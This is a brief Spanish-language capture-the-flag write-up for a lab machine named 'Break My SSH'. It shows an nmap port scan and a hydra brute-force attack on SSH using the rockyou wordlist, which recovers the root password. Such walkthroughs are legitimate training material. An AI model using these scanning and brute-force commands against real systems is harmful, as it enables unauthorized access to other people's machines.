# MÁQUINA BREAK MY SSH

Lo primeroq que tendremos que hacer será realizar un escaneo de puertos a la máquina víctima usando nmap:

```shell
nmap -p- -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```

![NMAP](https://github.com/Isma-yo/photos/blob/main/Break%20My%20SSH/foto.jpg)

Vemos que unicamente esta abierto el puerto 22, si buscamos vulnerabilidades con searchsploit y las probabamos vemos que no ocurre nada, por lo que la única solución que nos queda es hacer un ataque de fuerza bruta completamente a ciegas:

```shell
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![HYDRA](https://github.com/Isma-yo/photos/blob/main/Break%20My%20SSH/foto2.jpg)

Tras un rato probando podemos ver que si ponemos como usuario a root encuentra su contraseña:

![ROOT](https://github.com/Isma-yo/photos/blob/main/Break%20My%20SSH/foto3.jpg)

Y ya somos root!




